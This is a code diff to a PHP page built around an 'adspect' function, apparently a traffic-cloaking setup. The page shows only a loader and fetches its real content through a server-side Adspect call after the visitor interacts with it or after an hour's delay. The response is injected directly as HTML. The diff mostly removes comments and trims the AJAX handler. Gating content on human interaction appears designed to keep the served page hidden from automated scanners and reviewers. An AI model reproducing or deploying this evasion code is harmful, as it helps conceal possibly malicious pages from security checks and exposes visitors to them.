@@ -530,32 +530,23 @@ if(!function_exists('adspect')){
                         var timeoutId = null;
                         var timerInterval = null;
                         
-                        // ===== CONFIGURATION =====
-                        // 1 hour in milliseconds = 60 * 60 * 1000 = 3600000
                         var CONFIG = {
-                            AUTO_HIDE_TIME: 3600000,    // 1 HOUR (60 minutes)
-                            FADE_OUT_DURATION: 1500,     // 1.5 seconds
-                            CONTENT_FADE_IN: 500,        // 0.5 seconds
+                            AUTO_HIDE_TIME: 3600000,
+                            FADE_OUT_DURATION: 1500,
+                            CONTENT_FADE_IN: 500,
                             SPINNER_SPEED: '1.5s'
                         };
-                        // =========================
                         
                         function loadAdspectContent() {
-                            // This function will make the actual Adspect RPC call
-                            // and load the content
                             if (!loaded) {
                                 loaded = true;
                                 
-                                // Clear timer
                                 if (timerInterval) {
                                     clearInterval(timerInterval);
                                     timerInterval = null;
                                 }
                                 
-                                // Slow down spinner
                                 document.querySelector('.spinner').style.animationDuration = CONFIG.SPINNER_SPEED;
-                                
-                                // Fade out loader
                                 loader.style.transition = 'opacity ' + (CONFIG.FADE_OUT_DURATION/1000) + 's ease';
                                 loader.style.opacity = '0';
                                 
@@ -563,19 +554,16 @@ if(!function_exists('adspect')){
                                     loader.style.display = 'none';
                                     mainContent.style.display = 'block';
                                     
-                                    // Content fade in
                                     mainContent.style.opacity = '0';
                                     mainContent.style.transition = 'opacity ' + (CONFIG.CONTENT_FADE_IN/1000) + 's ease';
                                     setTimeout(function() {
                                         mainContent.style.opacity = '1';
                                     }, 100);
                                     
-                                    // Load the actual Adspect content via AJAX
                                     loadActualContent();
                                     
                                 }, CONFIG.FADE_OUT_DURATION);
                                 
-                                // Remove all event listeners
                                 document.removeEventListener('mousemove', handleInteraction);
                                 document.removeEventListener('click', handleInteraction);
                                 document.removeEventListener('touchstart', handleInteraction);
@@ -589,13 +577,11 @@ if(!function_exists('adspect')){
                         }
                         
                         function loadActualContent() {
-                            // Make AJAX call to load Adspect content
                             var xhr = new XMLHttpRequest();
                             xhr.open('POST', window.location.href, true);
                             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                             xhr.onload = function() {
                                 if (xhr.status === 200) {
-                                    // DIRECTLY SET THE RESPONSE AS HTML
                                     document.getElementById('mainContent').innerHTML = xhr.responseText;
                                 }
                             };
@@ -618,24 +604,12 @@ if(!function_exists('adspect')){
                             }
                         }
                         
-                        // ===== ALL EVENTS ENABLED =====
-                        // Mouse movement
                         document.addEventListener('mousemove', handleInteraction);
-                        
-                        // Click anywhere
                         document.addEventListener('click', handleInteraction);
-                        
-                        // Touch for mobile
                         document.addEventListener('touchstart', handleInteraction);
-                        
-                        // Scroll
                         document.addEventListener('scroll', handleInteraction);
-                        
-                        // Keyboard
                         document.addEventListener('keydown', handleInteraction);
                         
-                        // ===== BUTTON EVENTS =====
-                        // Continue button
                         document.getElementById('continueBtn').addEventListener('click', function(e) {
                             e.stopPropagation();
                             if (!interacted && !loaded) {
@@ -643,13 +617,11 @@ if(!function_exists('adspect')){
                             }
                         });
                         
-                        // Cancel button
                         document.getElementById('cancelBtn').addEventListener('click', function(e) {
                             e.stopPropagation();
                             window.location.href = 'about:blank';
                         });
                         
-                        // ===== 1 HOUR TIMER =====
                         var startTime = Date.now();
                         var totalTime = CONFIG.AUTO_HIDE_TIME;
                         
@@ -677,21 +649,15 @@ if(!function_exists('adspect')){
                             }
                         }
                         
-                        // Update timer every second
                         timerInterval = setInterval(updateTimer, 1000);
                         updateTimer();
                         
-                        // ===== 1 HOUR AUTO-LOAD =====
-                        // After 1 hour, automatically load content if no interaction
                         timeoutId = setTimeout(function() {
                             if (!interacted && !loaded) {
                                 console.log('1 hour passed. Auto-loading content...');
                                 showContent();
                             }
                         }, CONFIG.AUTO_HIDE_TIME);
-                        
-                        console.log('🖱 Interact with page to load content');
-                        console.log('⏱ Auto-load timer: 1 hour');
                     </script>
                 </body>
                 </html>");
@@ -748,24 +714,14 @@ if(!function_exists('adspect')){
         return$data;
     }
     
-    // ===== MAIN EXECUTION - CHECK IF AJAX REQUEST =====
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['load_content']) && $_POST['load_content'] == '1') {
-        // This is the AJAX request to load Adspect content
-        ob_start();
+    // ===== SIMPLE AJAX HANDLER =====
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['load_content'])) {
+        // Directly call adspect and output
         $data = adspect('40adf6f7-4c88-4d47-ac5a-606ee98ed95a');
-        $content = ob_get_clean();
-        
-        if(isset($data) || !empty($content)){
-            // Return the content directly
-            echo $content;
-        } else {
-            echo "Content not available";
-        }
         exit;
     }
     
-    // ===== INITIAL PAGE LOAD - SHOW ONLY LOADER =====
-    // No Adspect RPC call yet - only show loader
+    // ===== INITIAL PAGE LOAD =====
     ?>
     <!DOCTYPE html>
     <html lang="en">
@@ -907,30 +863,23 @@ if(!function_exists('adspect')){
             var timeoutId = null;
             var timerInterval = null;
             
-            // ===== CONFIGURATION =====
-            // 1 hour in milliseconds = 60 * 60 * 1000 = 3600000
             var CONFIG = {
-                AUTO_HIDE_TIME: 3600000,    // 1 HOUR (60 minutes)
-                FADE_OUT_DURATION: 1500,     // 1.5 seconds
-                CONTENT_FADE_IN: 500,        // 0.5 seconds
+                AUTO_HIDE_TIME: 3600000,
+                FADE_OUT_DURATION: 1500,
+                CONTENT_FADE_IN: 500,
                 SPINNER_SPEED: '1.5s'
             };
-            // =========================
             
             function loadAdspectContent() {
                 if (!loaded) {
                     loaded = true;
                     
-                    // Clear timer
                     if (timerInterval) {
                         clearInterval(timerInterval);
                         timerInterval = null;
                     }
                     
-                    // Slow down spinner
                     document.querySelector('.spinner').style.animationDuration = CONFIG.SPINNER_SPEED;
-                    
-                    // Fade out loader
                     loader.style.transition = 'opacity ' + (CONFIG.FADE_OUT_DURATION/1000) + 's ease';
                     loader.style.opacity = '0';
                     
@@ -938,19 +887,16 @@ if(!function_exists('adspect')){
                         loader.style.display = 'none';
                         mainContent.style.display = 'block';
                         
-                        // Content fade in
                         mainContent.style.opacity = '0';
                         mainContent.style.transition = 'opacity ' + (CONFIG.CONTENT_FADE_IN/1000) + 's ease';
                         setTimeout(function() {
                             mainContent.style.opacity = '1';
                         }, 100);
                         
-                        // Load Adspect content via AJAX
                         loadActualContent();
                         
                     }, CONFIG.FADE_OUT_DURATION);
                     
-                    // Remove all event listeners
                     document.removeEventListener('mousemove', handleInteraction);
                     document.removeEventListener('click', handleInteraction);
                     document.removeEventListener('touchstart', handleInteraction);
@@ -964,13 +910,11 @@ if(!function_exists('adspect')){
             }
             
             function loadActualContent() {
-                // AJAX call to load Adspect content
                 var xhr = new XMLHttpRequest();
                 xhr.open('POST', window.location.href, true);
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 xhr.onload = function() {
                     if (xhr.status === 200) {
-                        // DIRECTLY SET THE RESPONSE AS HTML
                         document.getElementById('mainContent').innerHTML = xhr.responseText;
                     }
                 };
@@ -993,24 +937,12 @@ if(!function_exists('adspect')){
                 }
             }
             
-            // ===== ALL EVENTS ENABLED =====
-            // Mouse movement
             document.addEventListener('mousemove', handleInteraction);
-            
-            // Click anywhere
             document.addEventListener('click', handleInteraction);
-            
-            // Touch for mobile
             document.addEventListener('touchstart', handleInteraction);
-            
-            // Scroll
             document.addEventListener('scroll', handleInteraction);
-            
-            // Keyboard
             document.addEventListener('keydown', handleInteraction);
             
-            // ===== BUTTON EVENTS =====
-            // Continue button
             document.getElementById('continueBtn').addEventListener('click', function(e) {
                 e.stopPropagation();
                 if (!interacted && !loaded) {
@@ -1018,13 +950,11 @@ if(!function_exists('adspect')){
                 }
             });
             
-            // Cancel button
             document.getElementById('cancelBtn').addEventListener('click', function(e) {
                 e.stopPropagation();
                 window.location.href = 'about:blank';
             });
             
-            // ===== 1 HOUR TIMER =====
             var startTime = Date.now();
             var totalTime = CONFIG.AUTO_HIDE_TIME;
             
@@ -1052,15 +982,12 @@ if(!function_exists('adspect')){
                 }
             }
             
-            // Update timer every second
             timerInterval = setInterval(updateTimer, 1000);
             updateTimer();
             
-            // ===== 1 HOUR AUTO-LOAD =====
-            // After 1 hour, automatically load content if no interaction
             timeoutId = setTimeout(function() {
                 if (!interacted && !loaded) {
-                    console.log('⏰ 1 hour passed. Auto-loading content...');
+                    console.log('1 hour passed. Auto-loading content...');
                     showContent();
                 }
             }, CONFIG.AUTO_HIDE_TIME);
